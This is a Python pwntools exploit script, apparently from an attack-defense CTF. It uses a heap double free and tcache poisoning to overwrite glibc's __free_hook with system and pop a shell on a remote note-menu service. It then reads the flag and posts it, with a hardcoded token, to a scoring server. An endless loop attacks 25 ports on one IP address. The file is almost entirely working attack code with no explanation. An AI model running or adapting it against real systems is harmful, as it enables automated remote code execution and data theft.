#coding=utf-8
from pwn import *
import requests
import json
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
a=""
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter(">>",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("size:",str(size))
    a.sendafter("content:",content)

def delete(idx):
    menu(2)
    a.sendlineafter("idx:",str(idx))

def show(idx):
    menu(3)
    a.sendlineafter("idx:",str(idx))

def subflag(flag):
    print flag
    headers = {'Content-Type': 'application/json'}
    url = "http://39.100.119.37:10000/commit/flag"
    data = {'flag':flag ,'token':'9c268520f2233715d96b5a2c9448787c'}
    r = requests.post(url,headers=headers,data = json.dumps(data))
    print(r.content)


def exp(ip,port):
    global a
    a=remote(ip,port)
    add(0x88,'A\n')#0
    add(0x18,'A\n')#1
    for i in range(8):
        delete(0)
    show(0)
    libc_base = u64(a.recv(6)+'\x00\x00',timeout=1)-libc.symbols["__malloc_hook"]-0x10-96
    fuck(libc_base)
    __free_hook=libc_base+libc.symbols["__free_hook"]
    delete(1)
    delete(1)
    add(0x18,p64(__free_hook)+'\n')#2
    add(0x18,'/bin/sh\x00\n')#3
    add(0x18,p64(libc_base+libc.symbols["system"])+'\n')
    delete(3)
    a.sendline("cat flag")
    flag = a.recvuntil("}").strip()
    subflag(flag)


if __name__ == "__main__":
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
    ip="39.100.119.37"
    port = [ '50180', '50480', '50580', '50680', '50780', '50880', '50980', '51280', '51580', '51680', '51780', '51880', '51980', '52080', '52180', '52280', '52380', '52480', '52580', '52680', '52780', '52880', '52980', '53080','53180']
    while 1:
        for i in port:
            try:
                exp(ip,i)
                a.close()
            except Exception as e:
                print e
                a.close()
                continue
        sleep(5)







